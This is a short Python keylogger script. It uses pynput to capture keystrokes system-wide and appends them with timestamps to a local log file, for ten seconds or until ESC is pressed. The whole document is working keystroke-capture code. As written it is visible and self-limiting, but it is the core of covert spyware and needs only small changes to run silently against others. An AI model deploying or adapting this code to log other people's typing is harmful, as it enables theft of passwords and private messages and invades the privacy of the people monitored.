#!/usr/bin/env python3
from pynput.keyboard import Key, Listener
import os
import time


os.makedirs("collected", exist_ok=True)
LOG_PATH = "collected/log.txt"


buffer = []

def write_to_file(buf):
    if not buf:
        return
    try:
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            ts = time.strftime("%Y-%m-%d %H:%M:%S")
            line = "".join(buf)
            f.write(f"{ts}  {line}\n")
        print(f"[write] Wrote {len(buf)} chars to {LOG_PATH}")
    except Exception as e:
        print(f"[error] Failed to write log: {e}")

def on_press(key):
    
    try:
        if hasattr(key, "char") and key.char is not None:
            buffer.append(key.char)
        else:
            
            if key == Key.space:
                buffer.append(" ")
            elif key == Key.enter:
                buffer.append("\n")
            
    except Exception as e:
        print("on_press error:", e)

def on_release(key):
    
    if key == Key.enter:
        write_to_file(buffer)
        buffer.clear()
        return True
    if key == Key.esc:
        # write remaining buffer then stop
        write_to_file(buffer)
        buffer.clear()
        return False
    return True

if __name__ == "__main__":
    print("Starting logger (type in the same terminal). Press ESC to stop early.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join(timeout=10)   # 10 seconds default for quick test
        write_to_file(buffer)
    buffer.clear()
    print("Finished. Check collected/log.txt")
